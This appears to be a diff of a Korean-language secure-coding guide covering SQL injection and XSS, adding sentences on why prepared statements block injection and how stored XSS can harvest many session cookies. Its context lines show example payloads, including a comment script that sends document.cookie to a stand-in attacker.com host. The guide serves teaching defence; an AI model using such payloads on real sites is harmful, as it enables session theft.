@@ -73,7 +73,7 @@ pstmt.setString(2, password);
 ResultSet rs = pstmt.executeQuery();
 ```
 
-PreparedStatement는 쿼리 구조를 먼저 컴파일한 뒤 파라미터를 **데이터**로만 바인딩한다. `admin' --`를 입력해도 SQL 문법으로 해석되지 않고 리터럴 문자열로 처리된다. 이것이 SQL Injection을 원천 차단하는 유일한 근본 해결책이다.
+PreparedStatement는 쿼리 구조를 먼저 컴파일한 뒤 파라미터를 **데이터**로만 바인딩한다. `admin' --`를 입력해도 SQL 문법으로 해석되지 않고 리터럴 문자열로 처리된다. 쿼리와 데이터를 분리하면 입력값이 아무리 악의적이어도 쿼리 구조 자체를 바꿀 수 없기 때문이다. 이것이 SQL Injection을 원천 차단하는 유일한 근본 해결책이다.
 
 ### ORM 사용 시 주의점
 
@@ -146,7 +146,7 @@ https://example.com/search?q=<script>document.location='https://attacker.com/ste
 댓글 내용: 좋은 글이네요! <script>fetch('https://attacker.com/'+document.cookie)</script>
 ```
 
-Stored XSS는 Reflected XSS보다 훨씬 위험하다. 링크 클릭 없이 페이지 방문만으로 모든 방문자가 피해를 입는다.
+Stored XSS는 Reflected XSS보다 훨씬 위험하다. 링크 클릭 없이 페이지 방문만으로 모든 방문자가 피해를 입는다. 악성 댓글 하나가 수천 명의 세션 쿠키를 자동으로 수집하는 시나리오가 가능하다는 뜻이다.
 
 ### DOM-based XSS
 
